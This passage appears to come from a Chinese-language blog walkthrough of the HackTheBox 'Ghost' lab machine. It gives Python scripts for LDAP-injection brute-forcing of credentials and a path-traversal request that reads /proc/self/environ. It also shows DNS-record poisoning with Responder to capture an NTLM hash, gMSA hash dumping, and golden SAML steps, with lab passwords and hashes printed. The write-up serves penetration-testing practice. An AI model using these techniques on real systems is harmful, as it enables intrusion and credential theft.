class="comment"># if char == &quot;*&quot;:</span></span><br><span class="line">    <span class="comment">#     print(&quot;\n&quot;)</span></span><br><span class="line">    <span class="comment">#     return</span></span><br><span class="line">    body = (</span><br><span class="line">        <span class="string">&#x27;-----------------------------3346689174189000912473093233\r\n&#x27;</span></span><br><span class="line">        <span class="string">&#x27;Content-Disposition: form-data; name=&quot;1_ldap-username&quot;\r\n\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;<span class="subst">&#123;head+test+char&#125;</span>*\r\n&#x27;</span></span><br><span class="line">        <span class="string">&#x27;-----------------------------3346689174189000912473093233\r\n&#x27;</span></span><br><span class="line">        <span class="string">&#x27;Content-Disposition: form-data; name=&quot;1_ldap-secret&quot;\r\n\r\n&#x27;</span></span><br><span class="line">        <span class="string">&#x27;*\r\n&#x27;</span></span><br><span class="line">        <span class="string">&#x27;-----------------------------3346689174189000912473093233\r\n&#x27;</span></span><br><span class="line">        <span class="string">&#x27;Content-Disposition: form-data; name=&quot;0&quot;\r\n\r\n&#x27;</span></span><br><span class="line">        <span class="string">&#x27;[&#123;&quot;error&quot;:&quot;Invalid combination of username and secret&quot;&#125;,&quot;$K1&quot;]\r\n&#x27;</span></span><br><span class="line">        <span class="string">&#x27;-----------------------------3346689174189000912473093233--\r\n&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    req = requests.post(url, headers=headers, data=body)</span><br><span class="line">    <span class="keyword">if</span> req.status_code == <span class="number">303</span>:</span><br><span class="line">        <span class="keyword">with</span> lock:</span><br><span class="line">            test+=char</span><br><span class="line">            <span class="built_in">print</span>(char, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        body = (</span><br><span class="line">            <span class="string">&#x27;-----------------------------3346689174189000912473093233\r\n&#x27;</span></span><br><span class="line">            <span class="string">&#x27;Content-Disposition: form-data; name=&quot;1_ldap-username&quot;\r\n\r\n&#x27;</span></span><br><span class="line">            <span class="string">f&#x27;<span class="subst">&#123;head + test&#125;</span>\r\n&#x27;</span></span><br><span class="line">            <span class="string">&#x27;-----------------------------3346689174189000912473093233\r\n&#x27;</span></span><br><span class="line">            <span class="string">&#x27;Content-Disposition: form-data; name=&quot;1_ldap-secret&quot;\r\n\r\n&#x27;</span></span><br><span class="line">            <span class="string">&#x27;*\r\n&#x27;</span></span><br><span class="line">            <span class="string">&#x27;-----------------------------3346689174189000912473093233\r\n&#x27;</span></span><br><span class="line">            <span class="string">&#x27;Content-Disposition: form-data; name=&quot;0&quot;\r\n\r\n&#x27;</span></span><br><span class="line">            <span class="string">&#x27;[&#123;&quot;error&quot;:&quot;Invalid combination of username and secret&quot;&#125;,&quot;$K1&quot;]\r\n&#x27;</span></span><br><span class="line">            <span class="string">&#x27;-----------------------------3346689174189000912473093233--\r\n&#x27;</span></span><br><span class="line">        )</span><br><span class="line">        req = requests.post(url, headers=headers, data=body)</span><br><span class="line">        <span class="keyword">if</span> req.status_code == <span class="number">303</span>:</span><br><span class="line">            test=<span class="string">&quot;&quot;</span></span><br><span class="line">            passwd = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">head</span>):</span><br><span class="line">    <span class="keyword">global</span> passwd</span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">22</span>) <span class="keyword">as</span> Ex:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            fus = [Ex.submit(test_char, head, char) <span class="keyword">for</span> char <span class="keyword">in</span> s]</span><br><span class="line">            <span class="keyword">for</span> fu <span class="keyword">in</span> fus:</span><br><span class="line">                fu.result()</span><br><span class="line">            <span class="keyword">if</span> passwd :</span><br><span class="line">                passwd = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">userls=<span class="string">&quot;k&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> userls:</span><br><span class="line">    <span class="built_in">print</span>(i, end=<span class="string">&quot;&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">    run(i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>得到用户名<code>Kathryn.Holland</code></p>
<p>再爆破了一下他的密码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line">s = string.printable</span><br><span class="line">url = <span class="string">&#x27;http://intranet.ghost.htb:8008/login&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;intranet.ghost.htb:8008&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/x-component&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Next-Action&#x27;</span>: <span class="string">&#x27;c471eb076ccac91d6f828b671795550fd5925940&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;multipart/form-data; boundary=---------------------------3346689174189000912473093233&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">lock = threading.Lock()</span><br><span class="line">test = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_char</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">global</span> test</span><br><span class="line"></span><br><span class="line">    body = (</span><br><span class="line">        <span class="string">&#x27;-----------------------------3346689174189000912473093233\r\n&#x27;</span></span><br><span class="line">        <span class="string">&#x27;Content-Disposition: form-data; name=&quot;1_ldap-username&quot;\r\n\r\n&#x27;</span></span><br><span class="line">        <span class="string">&#x27;justin.bradley\r\n&#x27;</span></span><br><span class="line">        <span class="string">&#x27;-----------------------------3346689174189000912473093233\r\n&#x27;</span></span><br><span class="line">        <span class="string">&#x27;Content-Disposition: form-data; name=&quot;1_ldap-secret&quot;\r\n\r\n&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;<span class="subst">&#123;test+char&#125;</span>*\r\n&#x27;</span></span><br><span class="line">        <span class="string">&#x27;-----------------------------3346689174189000912473093233\r\n&#x27;</span></span><br><span class="line">        <span class="string">&#x27;Content-Disposition: form-data; name=&quot;0&quot;\r\n\r\n&#x27;</span></span><br><span class="line">        <span class="string">&#x27;[&#123;&quot;error&quot;:&quot;Invalid combination of username and secret&quot;&#125;,&quot;$K1&quot;]\r\n&#x27;</span></span><br><span class="line">        <span class="string">&#x27;-----------------------------3346689174189000912473093233--\r\n&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    req = requests.post(url, headers=headers, data=body)</span><br><span class="line">    <span class="keyword">if</span> req.status_code == <span class="number">303</span>:</span><br><span class="line">        <span class="keyword">with</span> lock:</span><br><span class="line">            test += char</span><br><span class="line">            <span class="built_in">print</span>(char, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">20</span>) <span class="keyword">as</span> Ex:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        fus = [Ex.submit(test_char, char) <span class="keyword">for</span> char <span class="keyword">in</span> s]</span><br><span class="line">        <span class="keyword">for</span> fu <span class="keyword">in</span> fus:</span><br><span class="line">            fu.result()</span><br></pre></td></tr></table></figure>

<p>出了个<code>fGevLfyMxRksVu9B</code></p>
<p>然后继续爆破其他用户名，拿着<code>Kathryn.Holland</code>和密码去试了下别的地方smb ghost什么的。（这部分弱智了）</p>
<p>过了半天拿了几个用户名和密码，还是没啥收获就登录进去看了下，发现里面有完整的用户名..</p>
<table>
<thead>
<tr>
<th>username</th>
<th>Full Name</th>
<th>Member of</th>
</tr>
</thead>
<tbody><tr>
<td>kathryn.holland</td>
<td>Kathryn Holland</td>
<td>sysadmin</td>
</tr>
<tr>
<td>cassandra.shelton</td>
<td>Cassandra Shelton</td>
<td>sysadmin</td>
</tr>
<tr>
<td>robert.steeves</td>
<td>Robert Steeves</td>
<td>sysadmin</td>
</tr>
<tr>
<td>florence.ramirez</td>
<td>Florence Ramirez</td>
<td>IT</td>
</tr>
<tr>
<td>justin.bradley</td>
<td>Justin Bradley</td>
<td>IT, Remote Management Users</td>
</tr>
<tr>
<td>arthur.boyd</td>
<td>Arthur Boyd</td>
<td>IT</td>
</tr>
<tr>
<td>beth.clark</td>
<td>Beth Clark</td>
<td>HR</td>
</tr>
<tr>
<td>charles.gray</td>
<td>Charles Gray</td>
<td>HR</td>
</tr>
<tr>
<td>jason.taylor</td>
<td>Jason Taylor</td>
<td>HR</td>
</tr>
<tr>
<td>intranet_principal</td>
<td>Intranet Principal</td>
<td>principal</td>
</tr>
<tr>
<td>gitea_temp_principal</td>
<td>Gitea_Temp Principal</td>
<td>principal</td>
</tr>
</tbody></table>
<p>笑了</p>
<p>然后还有一部分比较重要的信息</p>
<p><img src="/wpimages/2024/Ghost/web9.jpg" alt="web9"></p>
<p>说是gitea只有<code>gitea_temp_principal</code>用户能上</p>
<p>以及</p>
<p><img src="/wpimages/2024/Ghost/web10.jpg" alt="web10"></p>
<p>目前这个站点正在迁移，有个<code>justin.bradley</code>用户正在跑脚本，但是他访问不到<code>bitbucket</code>,下面这个<code>kathryn.holland</code>说这个<code>bitbucket</code>dns还没配置。</p>
<p>然后果断拿着<code>Gitea_Temp Principal</code>用户去尝试登录一下gitea,这里我被密码坑到了，试了好久登陆不进去，我还以为是爆破的密码有问题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gitea_temp_principal</span><br><span class="line">szrr8kpc3z6onlqf</span><br></pre></td></tr></table></figure>



<p>然后又返回去想尝试注入看看ldap有没有别的password字段啥的</p>
<p>给了个<code>)&amp;(</code>闭合住了密码，返回303，然后注了一顿也没成功。。</p>
<p>然后返回来接着发现是密码粘贴有问题..</p>
<p>进去之后看到有两个项目，分别是：</p>
<p><strong>ghost-dev&#x2F;intranetPrivate</strong></p>
<p><strong>ghost-dev&#x2F;blog</strong></p>
<p>第一个应该就是internet子域项目了</p>
<p>第二个就是ghost.htb:8008的ghost的一个插件。</p>
<p>我先看的第一个项目，翻了翻之后发现<code>intranet/backend/src/api/dev/scan.rs</code></p>
<p><img src="/wpimages/2024/Ghost/web11.jpg" alt="web11"></p>
<p>这里有个rce，对<code>/scan</code>路径传进来的json格式key为<code>url</code>的value部分会直接执行。</p>
<p>不过这里我构造了一个过去<code>/api-dev/scan</code>他显示404</p>
<p>然后返回去看他上级目录的<code>intranet/backend/src/api/dev.rs</code></p>
<p>调用了这个<code>DevGuard</code>..</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">use rocket::http::<span class="title class_">Status</span>;</span><br><span class="line">use rocket::<span class="title class_">Request</span>;</span><br><span class="line">use rocket::request::&#123;<span class="title class_">FromRequest</span>, <span class="title class_">Outcome</span>&#125;;</span><br><span class="line"></span><br><span class="line">pub(crate) mod scan;</span><br><span class="line"></span><br><span class="line">pub struct <span class="title class_">DevGuard</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#[rocket::async_trait]</span></span><br><span class="line">impl&lt;<span class="string">&#x27;r&gt; FromRequest&lt;&#x27;</span>r&gt; <span class="keyword">for</span> <span class="title class_">DevGuard</span> &#123;</span><br><span class="line">    type <span class="title class_">Error</span> = ();</span><br><span class="line"></span><br><span class="line">    async fn from_request(<span class="symbol">request:</span> &amp;<span class="string">&#x27;r Request&lt;&#x27;</span>_&gt;) -&gt; <span class="title class_">Outcome</span>&lt;<span class="title class_">Self</span>, <span class="title class_">Self</span><span class="symbol">:</span><span class="symbol">:Error&gt;</span> &#123;</span><br><span class="line">        let key = request.headers().get_one(<span class="string">&quot;X-DEV-INTRANET-KEY&quot;</span>);</span><br><span class="line">        match key &#123;</span><br><span class="line">            <span class="title class_">Some</span>(key) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> key == std::env::var(<span class="string">&quot;DEV_INTRANET_KEY&quot;</span>).unwrap() &#123;</span><br><span class="line">                    <span class="title class_">Outcome</span><span class="symbol">:</span><span class="symbol">:Success</span>(<span class="title class_">DevGuard</span> &#123;&#125;)</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="title class_">Outcome</span><span class="symbol">:</span><span class="symbol">:Error</span>((<span class="title class_">Status</span><span class="symbol">:</span><span class="symbol">:Unauthorized</span>, ()))</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="title class_">None</span> =&gt; <span class="title class_">Outcome</span><span class="symbol">:</span><span class="symbol">:Error</span>((<span class="title class_">Status</span><span class="symbol">:</span><span class="symbol">:Unauthorized</span>, ()))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然我ruby学的一般，但是勉强能看出来他是监测<code>request.headers</code>里<code>&quot;X-DEV-INTRANET-KEY&quot;</code>字段,和他env里的<code>&quot;DEV_INTRANET_KEY&quot;</code>是否一致。</p>
<p>那问题就来了..这个<code>DEV_INTRANET_KEY</code>去哪整，或者说他的env去哪读..不过其实还挺明确的，这里优先考虑afr或者afd，这个靶机思路确实不是那么复杂。</p>
<p>有个稍微明确一点的思路，翻了翻这个项目里没啥读取漏洞，就去看了</p>
<p><code>ghost-dev/blog</code></p>
<p>打开<code>blog/posts-public.js</code>，比较搞笑的是他这个读取连名字都不带改改的，直接搜read当场出货</p>
<p><img src="/wpimages/2024/Ghost/web12.jpg" alt="web12"></p>
<p>但是很尴尬，我不会调用他的api…</p>
<p>所以我去查了下</p>
<p><a target="_blank" rel="noopener" href="https://ghost.org/docs/content-api/">https://ghost.org/docs/content-api/</a></p>
<p>然后发现</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Real endpoint - copy and paste to see!</span></span><br><span class="line">curl <span class="string">&quot;https://demo.ghost.io/ghost/api/content/posts/?key=22444f78447824223cefc48062&amp;include=tags,authors&quot;</span></span><br></pre></td></tr></table></figure>

<p>官网给的这个例子给的好眼熟</p>
<p>正就是<code>ghost.htb:8008</code>主页那个搜索按钮给点击时候弹出来超级卡的那个连接。</p>
<p><code>/ghost/api/content/posts/?key=37395e9e872be56438c83aaca6&amp;limit=10000&amp;fields=id%2Cslug%2Ctitle%2Cexcerpt%2Curl%2Cupdated_at%2Cvisibility&amp;order=updated_at%20DE</code></p>
<p>根据这个改了改，因为源码这部分</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> extra = frame.<span class="property">original</span>.<span class="property">query</span>?.<span class="property">extra</span>;</span><br><span class="line">            <span class="keyword">if</span> (extra) &#123;</span><br></pre></td></tr></table></figure>

<p>所以猜测参数是<code>extra</code>然后构造了一个</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://ghost.htb:8008/ghost/api/content/posts/?key=37395e9e872be56438c83aaca6&amp;extra=../../../../../../../../../../etc/hosts&#x27;</span> -s|jq</span><br></pre></td></tr></table></figure>

<p>拿到回显</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;extra&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">       <span class="attr">&quot;../../../../../../../../../../etc/hosts&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1\tlocalhost\n::1\tlocalhost ip6-localhost ip6-loopback\nfe00::0\tip6-localnet\nff00::0\tip6-mcastprefix\nff02::1\tip6-allnodes\nff02::2\tip6-allrouters\n172.19.0.2\t26ae7990f3dd\n&quot;</span></span><br></pre></td></tr></table></figure>

<p>尝试读取env拿header用的</p>
<p>读了下<code>/etc/environment</code>发现居然没有</p>
<p>怀疑是奇怪的环境，所以考虑了下还是去读了当前的env</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;extra&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;../../../../../../../../../../proc/self/environ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HOSTNAME=26ae7990f3dd</span></span><br><span class="line"><span class="string">  database__debug=false</span></span><br><span class="line"><span class="string">  YARN_VERSION=1.22.19</span></span><br><span class="line"><span class="string">  PWD=/var/lib/ghost</span></span><br><span class="line"><span class="string">  NODE_ENV=production</span></span><br><span class="line"><span class="string">  database__connection__filename=content/data/ghost.db</span></span><br><span class="line"><span class="string">  HOME=/home/node</span></span><br><span class="line"><span class="string">  database__client=sqlite3</span></span><br><span class="line"><span class="string">  url=http://ghost.htb</span></span><br><span class="line"><span class="string">  DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe</span></span><br><span class="line"><span class="string">  database__useNullAsDefault=true</span></span><br><span class="line"><span class="string">  GHOST_CONTENT=/var/lib/ghost/content</span></span><br><span class="line"><span class="string">  SHLVL=0</span></span><br><span class="line"><span class="string">  GHOST_CLI_VERSION=1.25.3</span></span><br><span class="line"><span class="string">  GHOST_INSTALL=/var/lib/ghost</span></span><br><span class="line"><span class="string">  PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span></span><br><span class="line"><span class="string">  NODE_VERSION=18.19.0</span></span><br><span class="line"><span class="string">  GHOST_VERSION=5.78.0&quot;</span></span><br></pre></td></tr></table></figure>

<p>这hostname一眼docker，拿到key了，于是直接冲进去</p>
<p><img src="/wpimages/2024/Ghost/web13.jpg" alt="web13"></p>
<p>果不其然在<code>/</code>下有<code>docker-entrypoint.sh</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@621de11273cb:/<span class="comment"># cat docker-entrypoint.sh</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> /root/.ssh</span><br><span class="line"><span class="built_in">mkdir</span> /root/.ssh/controlmaster</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;Host *</span></span><br><span class="line"><span class="string">  ControlMaster auto</span></span><br><span class="line"><span class="string">  ControlPath ~/.ssh/controlmaster/%%r@%%h:%%p</span></span><br><span class="line"><span class="string">  ControlPersist yes&#x27;</span> &gt; /root/.ssh/config</span><br><span class="line">  </span><br><span class="line">sshpass -p <span class="string">&#x27;uxLmt*udNc6t3HrF&#x27;</span> ssh -o <span class="string">&quot;StrictHostKeyChecking no&quot;</span> florence.ramirez@ghost.htb@dev-workstation</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> /app/ghost_intranet</span><br></pre></td></tr></table></figure>

<p>拿到了<code>florence.ramirez</code>的密码，顺便把他app的库拿出来看了下，没啥东西。</p>
<p>用它这个<code>sshpass -p &#39;uxLmt*udNc6t3HrF&#39; ssh -o &quot;StrictHostKeyChecking no&quot; florence.ramirez@ghost.htb@dev-workstation</code>直接在容器里运行了一下，发现跳到了一个wls。</p>
<p>在里面一顿乱翻没找到有价值的东西，或者说权限太低了..</p>
<p>返回容器，梳理一下手头拿到的一堆用户和密码，拿去登陆了一下，发现florence这个用户可以上mssql但是没有回显，rpc收集了一下信息，再没了。</p>
<p>考虑了下想起来还有8443端口没有访问。</p>
<p>于是去看了下</p>
<h3 id="ghost-htb-8443"><a href="#ghost-htb-8443" class="headerlink" title="ghost.htb:8443"></a>ghost.htb:8443</h3><p>直接给我跳转到</p>
<p><img src="/wpimages/2024/Ghost/web14.jpg" alt="web14"></p>
<p>用<code>florence.ramirez</code>登陆了一下 提示只有administrator有权限，不过我有抓到saml的认证请求，到这里首先想到的是<code>saml golden</code>绕过验证。</p>
<p>我参考的 <a target="_blank" rel="noopener" href="https://www.netwrix.com/golden_saml_attack.html">https://www.netwrix.com/golden_saml_attack.html</a></p>
<p>尝试发现需要导出dkm和tsk…有点尴尬，所以溜了下狗。</p>
<p>因为导出需要用gmsa服务账户，所以看了下..<br><img src="/wpimages/2024/Ghost/web16.jpg" alt="web16"></p>
<p>得用这个<code>JUSTIN.BRADLEY</code>用户</p>
<p><img src="/wpimages/2024/Ghost/web15.jpg" alt="web15"></p>
<p>思考了一下想起来之前那个<code>JUSTIN.BRADLEY</code>在论坛里说他正在跑脚本，目标是<code>bitbucket.ghost.htb</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ nslookup bitbucket.ghost.htb 10.10.11.24</span><br><span class="line">Server:         10.10.11.24</span><br><span class="line">Address:        10.10.11.24#53</span><br><span class="line"></span><br><span class="line">** server can&#x27;t find bitbucket.ghost.htb: NXDOMAIN</span><br></pre></td></tr></table></figure>

<p>看了下还真没有，我有点好奇他跑的是个什么脚本，所以尝试用<code>florence.ramirez</code>和<code>internal</code>这俩有密码的用户改一下他的dns解析。</p>
<p>试了下florence.ramirez可以</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dnstool.py -u <span class="string">&#x27;ghost.htb\florence.ramirez&#x27;</span> -p <span class="string">&#x27;uxLmt*udNc6t3HrF&#x27;</span> -r  <span class="string">&#x27;bitbucket.ghost.htb&#x27;</span> -a add -t A -d 10.10.16.24 10.10.11.24</span><br></pre></td></tr></table></figure>

<p>因为不知道具体是啥端口啥服务所以直接开了<code>responder</code>然后刚开就收到一个请求，笑死</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JUSTIN.BRADLEY::ghost:319ccea79aa1655b:ef59042c8f2711f0662ff96452a07ee0:01010000000000009b58f6791fd9da017afcdcd38b2057f000000000020008004e0032005100370001001e00570049004e002d004a0052004b0034004600570036004e0049004f005100040014004e003200510037002e004c004f00430041004c0003003400570049004e002d004a0052004b0034004600570036004e0049004f0051002e004e003200510037002e004c004f00430041004c00050014004e003200510037002e004c004f00430041004c00080030003000000000000000000000000040000028933c11f5345e9c8e7ed3448ec788b3386af689e196dce91ed13296d5d6ffec0a001000000000000000000000000000000000000900300048005400540050002f006200690074006200750063006b00650074002e00670068006f00730074002e006800740062000000000000000000:Qwertyuiop1234$$</span><br></pre></td></tr></table></figure>

<p>于是现在有了这个用户的密码了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JUSTIN.BRADLEY@ghost.htb</span><br><span class="line">Qwertyuiop1234$$</span><br></pre></td></tr></table></figure>

<p>用户在远程组里，所以直接winrm就ok</p>
<h1 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h1><p>这用户的作用还是拿一下gmsa用户的hash先</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 gMSADumper.py -u JUSTIN.BRADLEY -p <span class="string">&#x27;Qwertyuiop1234$$&#x27;</span> -d <span class="string">&#x27;ghost.htb&#x27;</span></span><br><span class="line">Users <span class="keyword">or</span> groups who can read password <span class="keyword">for</span> adfs_gmsa$:</span><br><span class="line"> &gt; DC01$</span><br><span class="line"> &gt; justin.bradley</span><br><span class="line">adfs_gmsa$:::4f4b81c5f6a9c1931310ece55a02a8d6</span><br><span class="line">adfs_gmsa$:aes256-cts-hmac-sha1-<span class="number">96</span>:fe641d9fcb8c2652d7bcaa8ae30c1a532742c634d562466eba7a2e799812f036</span><br><span class="line">adfs_gmsa$:aes128-cts-hmac-sha1-<span class="number">96</span>:a29e31f574541765a26cfde4a3070810</span><br></pre></td></tr></table></figure>

<p>winrm进去直接跑ADFSDump.exe</p>
<p>这里我输出当时忘记做记录了，所以就不贴上来了</p>
<p>跟着 <a target="_blank" rel="noopener" href="https://www.netwrix.com/golden_saml_attack.html">https://www.netwrix.com/golden_saml_attack.html</a> 流程来就ok</p>
<p>最后导出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat TKS | base64 -d &gt; TKS.bin</span><br><span class="line"></span><br><span class="line">cat DKM | tr -d &quot;-&quot; | xxd -r -p &gt; DKM.bin</span><br></pre></td></tr></table></figure>

<p>就可以有了这两个就可以做golden saml绕过了</p>
<p>这块要用ADFSpoof.py做，但因为ADFSpoof.py没有给具体的参数标准。</p>
<p>这里卡了四个小时最后朋友看不下去直接给的提示，顺便得知他的wp被人直接扒了，希望官方能把扒的人早点封了，真的恶心剽窃别人成果的，纯nt</p>
<p>因为这个web既不是dropbox也不是o365所以只有可能是saml2.0</p>
<p>这部分ADFSpoof我最后看着saml文档生成的，做完发现参数部分和朋友的有些许差异</p>
<p>先随便登录一个账户，用bp抓一下请求的报文，再去解码一下就得到了</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><br><span class="line">&lt;samlp<span class="punctuation">:</span>Response 